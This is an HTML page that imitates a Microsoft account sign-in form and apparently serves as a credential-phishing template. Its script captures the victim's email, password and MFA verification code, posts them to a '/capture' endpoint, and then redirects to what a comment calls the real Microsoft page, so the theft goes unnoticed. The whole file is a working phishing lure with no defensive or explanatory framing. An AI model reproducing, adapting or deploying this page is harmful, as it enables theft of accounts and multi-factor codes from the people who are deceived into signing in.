<!DOCTYPE html>
<html>
<head>
    <title>Sign in</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 360px; box-sizing: border-box; }
        h2 { text-align: center; color: #333; margin-top: 0; font-weight: 600; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; }
        button:hover { background: #0063b1; }
        .logo { display: block; margin: 0 auto 20px; width: 40px; height: 40px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Sign in</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email, phone, or Skype" required>
            <input type="password" id="password" placeholder="Password" required>
            <input type="text" id="mfa" placeholder="Verification code (optional)">
            <button type="submit">Sign in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const mfa = document.getElementById('mfa').value;
            
            // Send credentials to the backend
            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password, mfa })
            });

            // Redirect to the real Microsoft page after sending
            window.location.href = '__REDIRECT_URL__';
        });
    </script>
</body>
</html>
